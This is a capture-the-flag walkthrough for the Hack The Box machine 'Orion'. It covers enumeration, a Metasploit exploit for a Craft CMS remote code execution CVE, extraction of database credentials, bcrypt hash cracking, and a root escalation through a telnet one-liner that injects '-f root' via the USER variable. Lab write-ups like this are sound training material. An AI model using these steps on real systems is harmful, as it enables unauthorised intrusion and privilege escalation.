# Orion

> **Platform:** Hack The Box  
> **Difficulty:** Easy  
> **Operating System:** Linux

---

## Initial Enumeration

We start with some basic enumeration:

```bash
nmap -sV -sC 10.129.32.188

echo "10.129.32.188 orion.htb" | sudo tee -a /etc/hosts
```

![](images/Pasted%20image%2020260624211251.png)

Let's take a look at what we got:

![](images/Pasted%20image%2020260624211951.png)

At first glance, the **Contact** section is the only thing that stands out, so let's do some directory enumeration and see if anything else is exposed.

```bash
gobuster dir -u http://orion.htb \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

![](images/Pasted%20image%2020260625004357.png)

Directory enumeration reveals a login page running **Craft CMS 5.6.16**.

![](images/Pasted%20image%2020260624215054.png)

---

## Foothold

A quick Google search (or CVEDetails) for **Craft CMS 5.6.16** reveals a critical unauthenticated Remote Code Execution vulnerability:

- **CVE-2025-32432** (CVSS 10.0)

A Metasploit module already exists for this vulnerability, so let's use it.

```bash
msfconsole -q
```

![](images/Pasted%20image%2020260630231105.png)

After getting a shell, a bit of manual enumeration leads us to the application's database credentials.

![](images/Pasted%20image%2020260630231253.png)

Using the recovered credentials, we connect to the database:

```bash
mysql -u root -p orion
```

![](images/Pasted%20image%2020260630232157.png)

Inside the database we find Adam's password hash. Let's crack it with John.

```bash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![](images/Pasted%20image%2020260630232626.png)

The cracked password works for the local user **Adam**, giving us SSH access.

```bash
ssh adam@orion.htb
```

![](images/Pasted%20image%2020260630232903.png)

Once connected, we can retrieve the user flag.

```bash
cat user.txt
```

![](images/Pasted%20image%2020260630232959.png)

---

## Privilege Escalation

Time to look for a privilege escalation vector.

Running:

```bash
ss -tulpn
```

reveals a Telnet service listening locally.

![](images/Pasted%20image%2020260630235405.png)

Checking its version shows it's running **2.7**, which is vulnerable to **CVE-2026-24061**.

Exploiting the vulnerability is straightforward:

```bash
USER="-f root" telnet -a 127.0.0.1
```

The exploit immediately drops us into a root shell.

All that's left is retrieving the root flag.

![](images/Pasted%20image%2020260630235853.png)

---

## Conclusion

Orion is a straightforward machine that focuses on:

- Enumeration
- Web application vulnerability research
- Exploiting a known CVE
- Database credential extraction
- Password cracking
- Linux privilege escalation

Overall, it's a good beginner-friendly machine that reinforces the importance of proper enumeration and checking software versions for publicly available vulnerabilities.

**— 0xchnk**
